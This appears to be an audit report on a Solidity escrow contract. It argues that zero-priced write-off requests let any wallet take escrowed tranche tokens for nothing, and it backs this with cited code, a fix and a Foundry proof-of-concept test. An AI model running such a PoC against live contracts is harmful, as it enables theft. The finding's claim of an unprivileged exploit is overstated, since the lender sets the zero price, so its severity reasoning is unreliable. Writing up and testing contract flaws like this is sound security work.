### Title
Zero-priced write-off requests allow unprivileged buyers to seize escrowed tranche tokens - (File: `contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary
`createWriteOffRequest` validates that escrowed tranches are nonzero, but does not validate `underlyingsRequested`; a lender can therefore create a zero-price request, after which any unprivileged wallet can call `fullfillWriteOffRequest` with `_underlyings = 0` and receive all escrowed tranche tokens without paying underlying. [1](#0-0) [2](#0-1) 

### Finding Description
The escrow records `amount` tranche tokens and `underlyingsRequested` as the exchange terms, but only rejects `amount == 0`; it never rejects a zero underlying ask. [3](#0-2) 

During fulfillment, the contract only rejects an underlying payment lower than the stored ask, so `_underlyings == currentRequest.underlyings == 0` passes the request check. [4](#0-3) 

The function then clears the request, performs a zero-amount `safeTransferFrom`, pays the lender zero, and transfers the full `_tranches` balance to `msg.sender`. [5](#0-4) 

Fulfillment is explicitly callable by any wallet and does not enforce borrower, KYC, or whitelist authorization. [6](#0-5) 

### Impact Explanation
An attacker who sees a zero-priced write-off request can take the entire escrowed tranche position for no consideration, producing a direct loss equal to the tranche position’s current underlying value. [7](#0-6) 

For example, a request escrow sets `10_000e18` tranche tokens but requests `0` underlying; the attacker calls fulfillment with `0`, pays `0`, receives `10_000e18` tranche tokens, and the lender receives nothing. [8](#0-7) 

This breaks the escrow’s one-receipt-one-payment invariant: escrowed tranche collateral exits the contract even though the configured consideration was never required to be positive. [2](#0-1) 

### Likelihood Explanation
The attack requires only a running epoch, an approved tranche-token transfer into the escrow, and a zero `underlyingsRequested` value; no privileged role is needed. [9](#0-8) [10](#0-9) 

The request is atomically fulfilled before the lender can delete it, and any observer or searcher can exploit the request while it remains pending. [11](#0-10) [12](#0-11) 

No existing guard prevents the exploit because `amount == 0` is checked, `underlyingsRequested == 0` is not checked, and the payment comparison treats zero as valid. [13](#0-12) [14](#0-13) 

### Recommendation
Revert in `createWriteOffRequest` when `underlyingsRequested == 0`, using the existing `NotAllowed` or a dedicated `InvalidAmount` error. [1](#0-0) 

For compatibility with previously created zero-priced requests, `fullfillWriteOffRequest` should also reject `currentRequest.underlyings == 0` while preserving `deleteWriteOffRequest` so affected lenders can recover their tranche tokens. [11](#0-10) [12](#0-11) 

### Proof of Concept
The following Foundry PoC can be added to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol` after its existing set-up starts an epoch and grants `LP` a tranche balance. [15](#0-14) 

```solidity
function testZeroPriceWriteOffRequestCanBeSeized() external {
    uint256 escrowedTranches = 10_000e18;
    address attacker = makeAddr("attacker");

    uint256 attackerTranchePre = tranche.balanceOf(attacker);
    uint256 lenderUnderlyingPre = underlying.balanceOf(LP);

    // Running epoch: LP escrows tranche tokens but requests zero underlying.
    vm.prank(LP);
    escrow.createWriteOffRequest(escrowedTranches, 0);

    (uint256 requestTranches, uint256 requestUnderlyings) =
        escrow.userRequests(LP);
    assertEq(requestTranches, escrowedTranches);
    assertEq(requestUnderlyings, 0);

    // Unprivileged attacker pays exactly the stored zero ask.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, escrowedTranches, 0);

    (requestTranches, requestUnderlyings) = escrow.userRequests(LP);
    assertEq(requestTranches, 0);
    assertEq(requestUnderlyings, 0);
    assertEq(
        tranche.balanceOf(attacker) - attackerTranchePre,
        escrowedTranches,
        "attacker did not receive escrowed tranches"
    );
    assertEq(
        underlying.balanceOf(LP),
        lenderUnderlyingPre,
        "lender received underlying"
    );
}
```

The exploit transaction succeeds because `fullfillWriteOffRequest` accepts `_underlyings = 0` whenever the stored ask is zero, then transfers the escrowed tranches to the caller after the zero-value underlying transfer. [16](#0-15)

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L104-115)
```text
  /// @notice delete the write-off request and transfer tranche tokens back to the user
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L118-151)
```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** test/foundry/IdleCreditVaultWriteOffEscrow.t.sol (L82-115)
```text
  function testNonKeyringUsersCanCreateDeleteAndFulfillRequests() external {
    address keyring = address(1);

    vm.prank(cdoEpoch.owner());
    cdoEpoch.setKeyringParams(keyring, 1);

    vm.mockCall(
      keyring,
      abi.encodeWithSelector(IKeyring.checkCredential.selector),
      abi.encode(false)
    );

    uint256 sellerTrancheBalPre = tranche.balanceOf(LP);
    vm.startPrank(LP);
    escrow.createWriteOffRequest(1e18, 1e6);
    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);
    assertEq(tranches, 1e18, 'write-off request tranches is wrong after non-keyring create');
    assertEq(underlyings, 1e6, 'write-off request underlyings is wrong after non-keyring create');
    assertEq(escrow.pendingUnderlyings(), 1e6, 'pending underlyings is wrong after non-keyring create');
    escrow.deleteWriteOffRequest();
    vm.stopPrank();
    assertEq(tranche.balanceOf(LP), sellerTrancheBalPre, 'seller tranche balance is wrong after non-keyring delete');
    assertEq(escrow.pendingUnderlyings(), 0, 'pending underlyings is wrong after non-keyring delete');

    address buyer = makeAddr("buyer");
    vm.prank(LP);
    escrow.createWriteOffRequest(1e18, 1e6);
    deal(address(underlying), buyer, 1e6);
    uint256 buyerTrancheBalPre = tranche.balanceOf(buyer);
    vm.startPrank(buyer);
    underlying.approve(address(escrow), 1e6);
    escrow.fullfillWriteOffRequest(LP, 1e18, 1e6);
    vm.stopPrank();
    assertEq(tranche.balanceOf(buyer) - buyerTrancheBalPre, 1e18, 'buyer tranche balance is wrong after non-keyring fulfill');
```
